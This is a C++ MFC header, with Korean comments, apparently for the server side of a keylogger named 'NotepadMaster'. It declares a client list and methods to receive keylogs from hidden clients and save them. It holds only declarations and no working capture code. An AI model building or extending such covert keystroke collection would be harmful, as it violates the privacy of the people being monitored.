
// NotepadMasterServerDlg.h: 헤더 파일
//

#pragma once

#include <vector>

#include "CListenSocket.h"
#include "CClientSocket.h"
#include "CClient.h"

// CNotepadMasterServerDlg 대화 상자
class CNotepadMasterServerDlg : public CDialogEx
{
// 생성입니다.
public:
	CNotepadMasterServerDlg(CWnd* pParent = nullptr);	// 표준 생성자입니다.
// 대화 상자 데이터입니다.
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_NOTEPADMASTERSERVER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 지원입니다.


// 구현입니다.
protected:
	HICON m_hIcon;

	// 생성된 메시지 맵 함수
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CListCtrl m_list_clients;
	CListenSocket* m_listen_socket;
	std::vector<CClient*> m_client_list;
	void ClientAccept();
	afx_msg void OnDblclkListClients(NMHDR *pNMHDR, LRESULT *pResult);
	void SetInvisibleInfo(CClientSocket* pObj, CString internal_ip);
	void ReceiveKeylog(CClientSocket* pObj, PDUKeylog* pdu);
	void ClientClose(CClientSocket* pSock);
	afx_msg void OnBnClickedButtonSaveGlobalKeylogs();
};
